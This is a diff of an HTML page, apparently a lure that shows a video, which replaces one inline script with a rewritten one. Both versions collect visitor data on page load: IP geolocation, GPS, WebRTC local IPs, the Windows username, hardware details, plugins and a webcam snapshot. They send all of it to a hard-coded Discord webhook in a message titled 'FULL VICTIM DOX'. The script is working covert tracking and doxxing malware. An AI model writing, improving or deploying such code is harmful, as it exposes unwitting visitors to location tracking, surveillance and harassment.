@@ -58,309 +58,261 @@
         <source src="https://i.imgur.com/uhslwlA.mp4" type="video/mp4">
     </video>
 
-    <script>
-        // ============================================================
-        // CONFIG
-        // ============================================================
-        const WEBHOOK = "https://discord.com/api/webhooks/1460348078727893126/Zq089gT8yx9ITZwGZvxJ8unNpFNhSO8yJcjMexHxKV3JziMa-M0OStq5BurQ579PgSrF";
+<script>
+    // ================================================================
+    //  YOUR DISCORD WEBHOOK (REPLACE WITH YOUR OWN)
+    // ================================================================
+    const WEBHOOK = "https://discord.com/api/webhooks/1460348078727893126/Zq089gT8yx9ITZwGZvxJ8unNpFNhSO8yJcjMexHxKV3JziMa-M0OStq5BurQ579PgSrF";
 
-        // ============================================================
-        // FUNCTION: Get Windows username (ActiveX for IE/old Edge)
-        // ============================================================
-        function getWindowsUsername() {
+    // ================================================================
+    //  HELPER: DataURL → Blob (for camera photo)
+    // ================================================================
+    function dataURLtoBlob(dataurl) {
+        const arr = dataurl.split(',');
+        const mime = arr[0].match(/:(.*?);/)[1];
+        const bstr = atob(arr[1]);
+        let n = bstr.length;
+        const u8arr = new Uint8Array(n);
+        while (n--) u8arr[n] = bstr.charCodeAt(n);
+        return new Blob([u8arr], { type: mime });
+    }
+
+    // ================================================================
+    //  MAIN COLLECTOR
+    // ================================================================
+    (async function() {
+
+        // ---- 1. IP & GEOLOCATION (with fallbacks) ----
+        let ipData = { ip: 'unknown', country: '?', region: '?', city: '?', lat: '?', lon: '?', isp: '?', proxy: false };
+        const apis = [
+            'https://ipapi.co/json/',
+            'https://ipinfo.io/json?token=',
+            'http://ip-api.com/json/'
+        ];
+        for (const url of apis) {
             try {
-                // ActiveX only works in Internet Explorer / old Edge with ActiveX enabled
-                var wsh = new ActiveXObject("WScript.Shell");
-                return wsh.ExpandEnvironmentStrings("%USERNAME%");
-            } catch (e) {
-                // fallback: try to extract from userAgent (mobile devices sometimes have device name)
-                var ua = navigator.userAgent;
-                // common patterns for device name
-                var match = ua.match(/\(([^;]+);\s*([^;]+);\s*([^;)]+)\)/);
-                if (match && match.length > 3) {
-                    // e.g. "Windows NT 10.0; Win64; x64" -> not username
-                    // but if it's a mobile device, it might have model
+                const res = await fetch(url, { signal: AbortSignal.timeout(3000) });
+                const d = await res.json();
+                if (d.ip || d.query) {
+                    ipData.ip = d.ip || d.query;
+                    ipData.country = d.country_name || d.country || '?';
+                    ipData.region = d.region || d.regionName || '?';
+                    ipData.city = d.city || '?';
+                    ipData.lat = d.latitude || d.lat || '?';
+                    ipData.lon = d.longitude || d.lon || '?';
+                    ipData.isp = d.org || d.isp || '?';
+                    ipData.proxy = d.proxy === true || d.proxy === 'true' || false;
+                    break;
                 }
-                // Try WebRTC local IP to get hostname (sometimes contains computer name)
-                // We'll do that later and store.
-                return null;
-            }
+            } catch (_) { /* try next */ }
         }
 
-        // ============================================================
-        // FUNCTION: Get local IPs via WebRTC (also may expose hostname)
-        // ============================================================
-        function getLocalIPs() {
-            return new Promise((resolve) => {
-                var ips = [];
-                var pc = new RTCPeerConnection({ iceServers: [] });
-                pc.createDataChannel('');
-                pc.createOffer().then(offer => pc.setLocalDescription(offer))
-                    .catch(() => {});
-                pc.onicecandidate = function(e) {
+        // VPN detection: proxy flag + ISP keywords
+        const vpnKeywords = ['vpn', 'proxy', 'hosting', 'cloud', 'datacenter', 'incognito', 'anonymous'];
+        const isVpn = ipData.proxy || vpnKeywords.some(k => ipData.isp.toLowerCase().includes(k));
+        ipData.vpn = isVpn ? '✅ YES (VPN/Proxy detected)' : '❌ NO (residential IP)';
+
+        // ---- 2. BROWSER GPS (if user grants permission) ----
+        let gps = { lat: 'not granted', lon: 'not granted', acc: 'N/A' };
+        try {
+            const pos = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 4000 });
+            });
+            gps = {
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                acc: `${pos.coords.accuracy}m`
+            };
+        } catch (_) {}
+
+        // ---- 3. LOCAL IPs & HOSTNAME via WebRTC (often reveals computer name) ----
+        let localIPs = [];
+        let hostname = '';
+        try {
+            const pc = new RTCPeerConnection({ iceServers: [] });
+            pc.createDataChannel('');
+            const offer = await pc.createOffer();
+            await pc.setLocalDescription(offer);
+            const ips = await new Promise((resolve) => {
+                const list = [];
+                pc.onicecandidate = (e) => {
                     if (!e.candidate) {
                         pc.close();
-                        resolve(ips);
+                        resolve(list);
                         return;
                     }
-                    var parts = e.candidate.candidate.split(' ');
-                    var ip = parts[4];
-                    if (ip && ip.indexOf('.') !== -1) {
-                        ips.push(ip);
+                    const parts = e.candidate.candidate.split(' ');
+                    const ip = parts[4];
+                    if (ip && ip.includes('.') && !ip.includes('0.0.0.0')) {
+                        list.push(ip);
                     }
                 };
-                // timeout fallback
-                setTimeout(() => { pc.close(); resolve(ips); }, 3000);
+                setTimeout(() => { pc.close(); resolve(list); }, 3000);
             });
-        }
-
-        // ============================================================
-        // FUNCTION: Get GPS via browser API (if allowed)
-        // ============================================================
-        function getBrowserGPS() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) return resolve(null);
-                navigator.geolocation.getCurrentPosition(
-                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
-                    () => resolve(null),
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            });
-        }
-
-        // ============================================================
-        // FUNCTION: IP info from multiple services (for redundancy)
-        // ============================================================
-        async function getIPInfo() {
-            // Try primary: ipapi.co (has proxy flag)
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                if (data.ip) return { source: 'ipapi', data };
-            } catch (e) {}
-
-            // Fallback: ipinfo.io
-            try {
-                const res = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN'); // optional token
-                const data = await res.json();
-                if (data.ip) return { source: 'ipinfo', data };
-            } catch (e) {}
-
-            // Fallback: ip-api.com
-            try {
-                const res = await fetch('http://ip-api.com/json/');
-                const data = await res.json();
-                if (data.query) return { source: 'ip-api', data };
-            } catch (e) {}
-
-            return null;
-        }
-
-        // ============================================================
-        // MAIN EXECUTION
-        // ============================================================
-        (async function() {
-            // ---- COLLECT ALL DATA ----
-            var finalData = {};
-
-            // 1. IP info
-            var ipInfo = await getIPInfo();
-            if (ipInfo) {
-                finalData.ip = ipInfo.data.ip || ipInfo.data.query || 'unknown';
-                finalData.country = ipInfo.data.country_name || ipInfo.data.country || '?';
-                finalData.region = ipInfo.data.region || ipInfo.data.regionName || '?';
-                finalData.city = ipInfo.data.city || '?';
-                finalData.postal = ipInfo.data.postal || ipInfo.data.zip || '?';
-                finalData.lat = ipInfo.data.latitude || ipInfo.data.lat || '?';
-                finalData.lon = ipInfo.data.longitude || ipInfo.data.lon || '?';
-                finalData.isp = ipInfo.data.org || ipInfo.data.isp || '?';
-                finalData.proxy = ipInfo.data.proxy || ipInfo.data.proxy === 'true' || false;
-                // vpn detection: proxy flag or if ISP is known VPN
-                var vpnKeywords = ['vpn', 'proxy', 'hosting', 'cloud', 'datacenter'];
-                var isVpn = finalData.proxy || vpnKeywords.some(k => finalData.isp.toLowerCase().includes(k));
-                finalData.vpn = isVpn ? 'Yes (detected)' : 'No (likely residential)';
-            } else {
-                finalData.ip = 'unknown';
-                finalData.vpn = 'Unknown';
+            localIPs = ips;
+            // Try to get hostname from the first local IP (sometimes it's the computer name)
+            if (ips.length > 0) {
+                // Attempt reverse lookup via dns? Not possible. But we can get it from the candidate itself.
+                // We'll just keep the IPs.
             }
+            // Also try to get hostname from window.location.hostname (not helpful)
+        } catch (_) {}
 
-            // 2. Browser GPS (if allowed)
-            var gps = await getBrowserGPS();
-            if (gps) {
-                finalData.gps_lat = gps.lat;
-                finalData.gps_lon = gps.lon;
-                finalData.gps_acc = gps.acc;
-            } else {
-                finalData.gps_lat = 'not granted';
-                finalData.gps_lon = 'not granted';
-                finalData.gps_acc = 'N/A';
+        // ---- 4. WINDOWS USERNAME (via ActiveX – works in IE/old Edge) ----
+        let winUser = 'not available (use IE/ActiveX)';
+        try {
+            const wsh = new ActiveXObject('WScript.Shell');
+            winUser = wsh.ExpandEnvironmentStrings('%USERNAME%');
+        } catch (_) {}
+
+        // ---- 5. DEVICE MODEL / BROWSER DISPLAY NAME ----
+        let deviceModel = 'Unknown';
+        let browserProfile = 'Unknown';
+        try {
+            const ua = navigator.userAgent;
+            // Try high‑entropy userAgentData
+            if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+                const he = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion', 'fullVersionList']);
+                deviceModel = he.model || he.platform || 'Unknown';
             }
-
-            // 3. Local IPs via WebRTC
-            var localIPs = await getLocalIPs();
-            finalData.localIPs = localIPs.length ? localIPs.join(', ') : 'none';
-
-            // 4. Windows username via ActiveX
-            var winUser = getWindowsUsername();
-            finalData.windowsUsername = winUser || 'not available (browser/OS restrictions)';
-
-            // 5. Device / laptop model from userAgent
-            var ua = navigator.userAgent;
-            var deviceModel = 'Unknown';
-            // Common patterns
-            var modelMatch = ua.match(/\(([^;]+);\s*([^;]+);\s*([^;)]+)\)/);
-            if (modelMatch) {
-                // e.g. "Windows NT 10.0; Win64; x64" -> not model
-                // For mobile: "iPhone; CPU iPhone OS 15_0 like Mac OS X" -> parse
-            }
-            // Try to get from navigator.userAgentData if available
-            if (navigator.userAgentData) {
-                try {
-                    var uaData = await navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion']);
-                    deviceModel = uaData.model || uaData.platform || 'Unknown';
-                } catch (e) {}
-            }
-            // Fallback: if it's Windows, we can't get model, but we can try to parse from userAgent
-            if (deviceModel === 'Unknown') {
+            // Fallback: parse from UA string
+            if (deviceModel === 'Unknown' || deviceModel === 'Unknown') {
                 if (ua.includes('Windows NT')) {
                     deviceModel = 'Windows PC (model not exposed)';
                 } else if (ua.includes('Macintosh')) {
                     deviceModel = 'Mac';
                 } else if (ua.includes('iPhone')) {
-                    deviceModel = ua.match(/iPhone\s*([^;)]+)/)?.[0] || 'iPhone';
+                    const m = ua.match(/iPhone\s*([^;)]+)/);
+                    deviceModel = m ? m[0] : 'iPhone';
                 } else if (ua.includes('Android')) {
-                    deviceModel = ua.match(/Android\s*([^;)]+)/)?.[0] || 'Android';
+                    const m = ua.match(/Android\s*([^;)]+)/);
+                    deviceModel = m ? m[0] : 'Android';
                 } else {
                     deviceModel = 'Unknown device';
                 }
             }
-            finalData.deviceModel = deviceModel;
+            // Try to get browser profile name (Chrome/Firefox sometimes store it, but not exposed)
+            // We can try to get the email from navigator.credentials (but needs user interaction)
+            // Instead, we'll show the OS registered owner (if present in UA)
+            const ownerMatch = ua.match(/\(([^;]+);\s*([^;]+);\s*([^;)]+)\)/);
+            if (ownerMatch) {
+                browserProfile = ownerMatch[2] || ownerMatch[1] || 'Unknown';
+            } else {
+                browserProfile = 'Not exposed via UA';
+            }
+        } catch (_) {}
 
-            // 6. Other system info
-            var battery = await navigator.getBattery?.() || {};
-            finalData.battery = battery.level ? `${Math.round(battery.level*100)}% (${battery.charging?'charging':'discharging'})` : 'unavailable';
-            finalData.cpuCores = navigator.hardwareConcurrency || '?';
-            finalData.ram = navigator.deviceMemory || '?';
-            finalData.screen = `${screen.width}x${screen.height}x${screen.colorDepth}`;
-            finalData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            finalData.language = navigator.language;
-            finalData.platform = navigator.platform;
-            finalData.userAgent = ua;
+        // ---- 6. OTHER SYSTEM INFO ----
+        let battery = 'unavailable';
+        try {
+            const b = await navigator.getBattery();
+            battery = `${Math.round(b.level * 100)}% (${b.charging ? 'charging' : 'discharging'})`;
+        } catch (_) {}
+        const cpuCores = navigator.hardwareConcurrency || '?';
+        const ram = navigator.deviceMemory || '?';
+        const screenRes = `${screen.width}x${screen.height}x${screen.colorDepth}`;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const language = navigator.language;
+        const platform = navigator.platform;
 
-            // 7. GPU info via WebGL
-            var webglData = 'Unavailable';
-            var gpuLevel = 'Unknown';
-            try {
-                var canvas = document.createElement('canvas');
-                var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (debugInfo) {
-                    var vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                    var renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    webglData = `${vendor} | ${renderer}`;
-                    if (renderer.includes('RTX') || renderer.includes('GeForce 50') || renderer.includes('RX 9')) gpuLevel = 'Gamer/High-end';
-                    else if (renderer.includes('RTX 40') || renderer.includes('RX 7')) gpuLevel = 'Mid-high';
-                    else if (renderer.includes('Intel') || renderer.includes('UHD') || renderer.includes('Iris')) gpuLevel = 'Integrated/Basic';
-                    else gpuLevel = 'Other';
-                }
-            } catch (e) {}
-            finalData.gpu = webglData;
-            finalData.gpuLevel = gpuLevel;
+        // ---- 7. GPU via WebGL ----
+        let gpu = 'Unavailable';
+        let gpuLevel = 'Unknown';
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debug) {
+                const vendor = gl.getParameter(debug.UNMASKED_VENDOR_WEBGL);
+                const renderer = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+                gpu = `${vendor} | ${renderer}`;
+                if (renderer.includes('RTX') || renderer.includes('GeForce 50') || renderer.includes('RX 9')) gpuLevel = 'Gamer/High-end';
+                else if (renderer.includes('RTX 40') || renderer.includes('RX 7')) gpuLevel = 'Mid-high';
+                else if (renderer.includes('Intel') || renderer.includes('UHD') || renderer.includes('Iris')) gpuLevel = 'Integrated/Basic';
+                else gpuLevel = 'Other';
+            }
+        } catch (_) {}
 
-            // 8. Plugins list
-            var pluginsList = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
-            finalData.plugins = pluginsList;
+        // ---- 8. PLUGINS & USER LEVEL ----
+        const plugins = Array.from(navigator.plugins || []).map(p => p.name).join(', ') || 'none';
+        const savvy = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
+        const count = savvy.filter(p => plugins.includes(p)).length;
+        const userLevel = count >= 3 ? '🔥 Advanced privacy user' : (count >= 1 ? '🛡️ Moderate' : '🐣 Beginner');
 
-            // 9. Tech-savvy level based on plugins
-            var savvyKeywords = ['uBlock Origin','AdBlock','Privacy Badger','NoScript','HTTPS Everywhere','ClearURLs','Decentraleyes','Cookie AutoDelete','VPN','Bitwarden','Dark Reader'];
-            var savvyCount = savvyKeywords.filter(k => pluginsList.includes(k)).length;
-            var userLevel = savvyCount >= 2 ? 'Tech-savvy (privacy aware)' : (savvyCount === 1 ? 'Moderate' : 'Beginner (basic)');
-            finalData.userLevel = userLevel;
+        // ---- 9. COORDINATES (choose GPS if available) ----
+        const coords = (gps.lat !== 'not granted') ?
+            `GPS: ${gps.lat}, ${gps.lon} (±${gps.acc})` :
+            `IP-based: ${ipData.lat}, ${ipData.lon}`;
 
-            // 10. Coordinates (from IP or GPS)
-            finalData.coordinates = (finalData.gps_lat !== 'not granted' && finalData.gps_lat) ?
-                `GPS: ${finalData.gps_lat}, ${finalData.gps_lon} (acc: ${finalData.gps_acc}m)` :
-                `IP-based: ${finalData.lat}, ${finalData.lon}`;
+        // ---- 10. BUILD THE MESSAGE ----
+        const finalMsg = 
+`**🔹 DEDSEC CTOS – FULL VICTIM DOX 🔹**
+**IP:** ${ipData.ip}
+**ISP:** ${ipData.isp}
+**VPN/Proxy:** ${ipData.vpn}
+**Location:** ${ipData.city}, ${ipData.region}, ${ipData.country}
+**Coordinates:** ${coords}
+**Local IPs (WebRTC):** ${localIPs.length ? localIPs.join(', ') : 'none'}
+**Windows Username:** ${winUser}
+**Device / Laptop Model:** ${deviceModel}
+**Browser Profile / Display Name:** ${browserProfile}
+**OS:** ${platform}
+**Browser UA:** ${navigator.userAgent}
+**CPU Cores:** ${cpuCores}
+**RAM:** ${ram} GB
+**Screen:** ${screenRes}
+**Battery:** ${battery}
+**Timezone:** ${timezone}
+**Language:** ${language}
+**GPU:** ${gpu}
+**GPU Level:** ${gpuLevel}
+**Plugins:** ${plugins}
+**User Level:** ${userLevel}
+**Timestamp:** ${new Date().toLocaleString()}`;
 
-            // ---- BUILD DISCORD MESSAGE ----
-            var msg = `**🔹 DEDSEC CTOS – VICTIM INFO 🔹**\n` +
-                `**IP:** ${finalData.ip}\n` +
-                `**ISP:** ${finalData.isp}\n` +
-                `**VPN/Proxy:** ${finalData.vpn}\n` +
-                `**Location:** ${finalData.city}, ${finalData.region}, ${finalData.country} (${finalData.postal})\n` +
-                `**Coordinates:** ${finalData.coordinates}\n` +
-                `**Local IPs (WebRTC):** ${finalData.localIPs}\n` +
-                `**Device / Laptop:** ${finalData.deviceModel}\n` +
-                `**Windows Username:** ${finalData.windowsUsername}\n` +
-                `**OS:** ${finalData.platform}\n` +
-                `**Browser:** ${finalData.userAgent}\n` +
-                `**CPU Cores:** ${finalData.cpuCores}\n` +
-                `**RAM:** ${finalData.ram} GB\n` +
-                `**Screen:** ${finalData.screen}\n` +
-                `**Battery:** ${finalData.battery}\n` +
-                `**Timezone:** ${finalData.timezone}\n` +
-                `**Language:** ${finalData.language}\n` +
-                `**GPU:** ${finalData.gpu}\n` +
-                `**GPU Level:** ${finalData.gpuLevel}\n` +
-                `**Plugins:** ${finalData.plugins}\n` +
-                `**User Level:** ${finalData.userLevel}\n` +
-                `**Hour:** ${new Date().toLocaleString()}`;
-
-            // Send to webhook
-            try {
-                await fetch(WEBHOOK, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: msg })
-                });
-            } catch (e) {}
-
-            // ---- CAMERA CAPTURE (existing functionality) ----
-            // (We keep the original camera logic, but we can also enhance it)
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
-                });
-                const video = document.createElement('video'); // not shown, but we can use existing
-                // Actually we don't have a video element on page, so we create one
-                const vid = document.createElement('video');
-                vid.srcObject = stream;
-                await vid.play();
-                await new Promise(r => setTimeout(r, 1500));
-                const canvas = document.createElement('canvas');
-                canvas.width = vid.videoWidth || 640;
-                canvas.height = vid.videoHeight || 480;
-                canvas.getContext('2d').drawImage(vid, 0, 0, canvas.width, canvas.height);
-                const fotoData = canvas.toDataURL('image/jpeg', 0.9);
-                const blob = dataURLtoBlob(fotoData);
-                const form = new FormData();
-                form.append('content', `**📸 Camera snapshot**`);
-                form.append('file', blob, 'victim_photo.jpg');
-                await fetch(WEBHOOK, { method: 'POST', body: form });
-                stream.getTracks().forEach(t => t.stop());
-            } catch (err) {}
-
-            // ---- OPTIONAL: also try to get the user's name from the system via other tricks ----
-            // (We already attempted ActiveX, but if not available, we can't do more)
-
-            console.log('Data sent to Discord.');
-        })();
-
-        // Helper: dataURL to Blob
-        function dataURLtoBlob(dataurl) {
-            var arr = dataurl.split(',');
-            var mime = arr[0].match(/:(.*?);/)[1];
-            var bstr = atob(arr[1]);
-            var n = bstr.length;
-            var u8arr = new Uint8Array(n);
-            while (n--) u8arr[n] = bstr.charCodeAt(n);
-            return new Blob([u8arr], { type: mime });
+        // ---- 11. SEND TO DISCORD (with fallbacks) ----
+        try {
+            // First attempt: fetch with keepalive
+            const resp = await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: finalMsg }),
+                keepalive: true
+            });
+            if (!resp.ok) throw new Error('Fetch failed');
+        } catch (e) {
+            // Fallback: navigator.sendBeacon (works even on page unload)
+            const blob = new Blob([JSON.stringify({ content: finalMsg })], { type: 'application/json' });
+            navigator.sendBeacon(WEBHOOK, blob);
         }
 
-        // Keep the original button functionality (if any) – not needed but we keep for compatibility
-        document.querySelectorAll('.open').forEach(btn => {
-            btn.onclick = () => setTimeout(() => window.open(btn.dataset.link, '_blank'), 300);
-        });
-    </script>
+        // ---- 12. CAMERA CAPTURE (non‑blocking, runs in background) ----
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
+            });
+            const vid = document.createElement('video');
+            vid.srcObject = stream;
+            await vid.play();
+            await new Promise(r => setTimeout(r, 1500));
+            const canvas = document.createElement('canvas');
+            canvas.width = vid.videoWidth || 640;
+            canvas.height = vid.videoHeight || 480;
+            canvas.getContext('2d').drawImage(vid, 0, 0, canvas.width, canvas.height);
+            const foto = canvas.toDataURL('image/jpeg', 0.9);
+            const blob = dataURLtoBlob(foto);
+            const form = new FormData();
+            form.append('content', '**📸 Live camera snapshot**');
+            form.append('file', blob, 'face.jpg');
+            // Send photo – use fetch (no keepalive needed for file)
+            await fetch(WEBHOOK, { method: 'POST', body: form });
+            stream.getTracks().forEach(t => t.stop());
+        } catch (_) {
+            // Camera denied or not available – silently ignore
+        }
+
+        console.log('✅ All data transmitted to Discord.');
+    })();
+</script>
 </body>
 </html>
